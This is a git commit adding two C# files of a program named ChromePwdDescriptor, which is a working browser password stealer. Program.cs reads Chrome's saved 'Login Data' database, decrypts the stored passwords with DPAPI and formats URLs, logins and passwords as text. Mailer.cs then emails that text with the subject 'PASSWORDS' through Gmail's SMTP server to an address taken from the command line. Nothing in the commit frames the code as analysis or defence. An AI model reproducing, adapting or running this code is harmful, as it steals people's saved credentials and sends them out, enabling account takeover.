64e4379a2b99a573003fcf4c07c607f66d6e70d7
TrixiS <55791844+TrixiS@users.noreply.github.com>
2019-11-18 22:31:43 +0500

    Add files via upload

---
+++ Mailer.cs
@@ -0,0 +1,57 @@
+﻿using System.Net;
+using System.Net.Mail;
+
+namespace ChromePwdDescriptor
+{
+	public class Mailer
+	{
+		private readonly MailAddress fromMail;
+		private readonly SmtpClient smtpClient;
+
+		private readonly string subject = "PASSWORDS";
+
+		public Mailer(string host, int port, string login, string pwd)
+		{
+			this.fromMail = new MailAddress(login, subject);
+
+			this.smtpClient = new SmtpClient
+			{
+				Host = host,
+				Port = port,
+				EnableSsl = true,
+				DeliveryMethod = SmtpDeliveryMethod.Network,
+				UseDefaultCredentials = false,
+				Credentials = new NetworkCredential(this.fromMail.Address, pwd)
+			};
+		}
+
+		~Mailer()
+		{
+			this.smtpClient.Dispose();
+		}
+
+		public bool SendMail(string email, string messageText)
+		{
+			using (MailMessage message = new MailMessage(this.fromMail, new MailAddress(email)))
+			{
+				message.Subject = subject;
+				message.Body = messageText;
+
+				bool result;
+
+				try
+				{
+					this.smtpClient.Send(message);
+
+					result = true;
+				}
+				catch
+				{
+					result = false;
+				}
+
+				return result;
+			}
+		}
+	}
+}
---
+++ Program.cs
@@ -0,0 +1,55 @@
+﻿using System;
+using System.Data;
+using System.Data.SQLite;
+using System.Text;
+
+namespace ChromePwdDescriptor
+{
+	class Program
+	{
+		static void Main(string[] args)
+		{
+			string sendTo = args.Length > 0 ? args[0] : "";
+
+			DataTable DT = new DataTable();
+
+			const string sql = "SELECT `origin_url`, `username_value`, `password_value` FROM `logins`";
+			string dbPath = "Data Source=" + (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data");
+			string result = String.Empty;
+
+			using (SQLiteConnection conn = new SQLiteConnection(dbPath))
+			{
+				SQLiteCommand cmd = new SQLiteCommand(sql, conn);
+				SQLiteDataAdapter adapter = new SQLiteDataAdapter(cmd);
+
+				adapter.Fill(DT);
+
+				byte[] passBytes, descryptedPass;
+				string login, password, url;
+
+				for (int i = 0; i < DT.Rows.Count; i++)
+				{
+					passBytes = (byte[])DT.Rows[i][2];
+					descryptedPass = DPAPI.Decrypt(passBytes, null, out string _);
+
+					password = new UTF8Encoding(true).GetString(descryptedPass);
+
+					if (password.Length > 0)
+					{
+						login = (string)DT.Rows[i][1];
+
+						if (login.Length > 0)
+						{
+							url = (string)DT.Rows[i][0];
+
+							result += String.Format("URL = [{0}]\nLOGIN = [{1}]\nPASSWORD = [{2}]\n\n", url, login, password);
+						}
+					}
+				}
+			}
+
+			Mailer mailer = new Mailer("smtp.gmail.com", 587, "", "");
+			mailer.SendMail(sendTo, result);
+		}
+	}
+}
